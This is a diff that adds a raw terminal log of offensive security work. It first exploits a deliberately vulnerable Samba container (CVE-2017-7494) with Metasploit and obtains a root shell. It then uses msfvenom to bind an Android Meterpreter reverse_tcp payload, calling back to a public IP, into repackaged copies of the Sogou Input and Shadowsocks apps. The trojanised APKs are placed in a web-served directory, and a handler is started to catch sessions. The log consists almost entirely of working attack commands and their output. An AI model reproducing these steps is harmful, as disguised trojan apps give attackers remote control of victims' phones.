@@ -1,0 +1,144 @@
+[root@Myhost cve-2017-7494]# yum install -y docker
+
+[root@Myhost cve-2017-7494]# docker pull medicean/vulapps:s_samba_1
+
+[root@Myhost cve-2017-7494]# systemctl start dockerd
+
+[root@Myhost cve-2017-7494]# docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1
+
+[root@Myhost cve-2017-7494]# docker ps -a
+
+
+[root@Myhost cve-2017-7494]# docker inspect --format='{{.NetworkSettings.IPAddress}}' $(docker ps -a -q)
+
+
+[root@Myhost cve-2017-7494]# nmap 172.18.0.2
+
+[root@Myhost cve-2017-7494]# cd /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.15.6/modules/exploits/linux/samba
+
+
+[root@Myhost samba]# msfconsole
+
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v4.15.6-dev                          ]
++ -- --=[ 1673 exploits - 960 auxiliary - 295 post        ]
++ -- --=[ 489 payloads - 40 encoders - 9 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+msf > search is_known_pipename
+
+Matching Modules
+================
+
+   Name                                   Disclosure Date  Rank       Description
+   ----                                   ---------------  ----       -----------
+   exploit/linux/samba/is_known_pipename  2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
+
+
+msf > use exploit/linux/samba/is_known_pipename
+msf exploit(is_known_pipename) > show options
+
+Module options (exploit/linux/samba/is_known_pipename):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   RHOST                            yes       The target address
+   RPORT           445              yes       The SMB service port (TCP)
+   SMB_FOLDER                       no        The directory to use within the writeable SMB share
+   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Interact)
+
+
+msf exploit(is_known_pipename) > set RHOST 172.18.0.2
+RHOST => 172.18.0.2
+msf exploit(is_known_pipename) > exploit
+
+[*] 172.18.0.2:445 - Using location \\172.18.0.2\share\ for the path
+[*] 172.18.0.2:445 - Retrieving the remote path of the share 'share'
+[*] 172.18.0.2:445 - Share 'share' has server-side path '/tmp/
+[*] 172.18.0.2:445 - Uploaded payload to \\172.18.0.2\share\lNQVgVVV.so
+[*] 172.18.0.2:445 - Loading the payload from server-side path /tmp/lNQVgVVV.so using \\PIPE\/tmp/lNQVgVVV.so...
+[-] 172.18.0.2:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+[*] 172.18.0.2:445 - Loading the payload from server-side path /tmp/lNQVgVVV.so using /tmp/lNQVgVVV.so...
+[+] 172.18.0.2:445 - Probe response indicates the interactive payload was loaded...
+[*] Found shell.
+[*] Command shell session 1 opened (172.18.0.1:35745 -> 172.18.0.2:445) at 2017-08-30 15:43:11 +0800
+whoami
+root
+uname -a
+Linux bd61529110bb 3.10.0-514.26.2.el7.x86_64 #1 SMP Tue Jul 4 15:04:05 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+
+
+[root@Myhost msf]# msfvenom -x sgsrf.apk -p android/meterpreter/reverse_tcp LHOST=47.93.243.102 LPORT=233 -o /var/www/html/test/SogouInput_android_v8.12_sweb.apk
+Using APK template: sgsrf.apk
+No platform was selected, choosing Msf::Module::Platform::Android from the payload
+No Arch selected, selecting Arch: dalvik from the payload
+Error: jarsigner not found. If it's not in your PATH, please add it.
+
+
+msf > search android/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   Name                                     Disclosure Date  Rank    Description
+   ----                                     ---------------  ----    -----------
+   payload/android/meterpreter/reverse_tcp                   normal  Android Meterpreter, Android Reverse TCP Stager
+
+[root@Myhost msf]# msfvenom -x sgsrf.apk -p payload/android/meterpreter/reverse_tcp LHOST=47.93.243.102 LPORT=233 -o /var/www/html/test/SogouInput_android_v8.12_sweb.apk
+Error: Invalid Payload Selected
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[root@Myhost jdk]# msfvenom -x shadowsocks-nightly-4.2.4.apk -p android/meterpreter/reverse_tcp LHOST=47.93.243.102 LPORT=233 -o /var/www/html/test/shadowsocks-nightly-4.2.4.apk
+
+
+
+
+
+
+[root@Myhost msf]# msfvenom -p android/meterpreter/reverse_tcp LHOST=47.93.243.102 LPORT=233 -o /var/www/html/test/SogouInput_android_v8.12_sweb.apk
+    msf>use exploit/multi/handler
+
+    msf exploit(handler) > set payload android/meterpreter/reverse_tcp
+
+    payload => android/meterpreter/reverse_tcp
+
+    msf exploit(handler) > set lhost 47.93.243.102
+
+    lhost => <OUR_PUBLIC_IP>
+
+    msf exploit(handler) > set lport 233
+
+    lport => 233
+
+    msf exploit(handler) > exploit -j -z
+
+    [*] Started reverse TCP handler on <OUR_PUBLIC_IP>:233
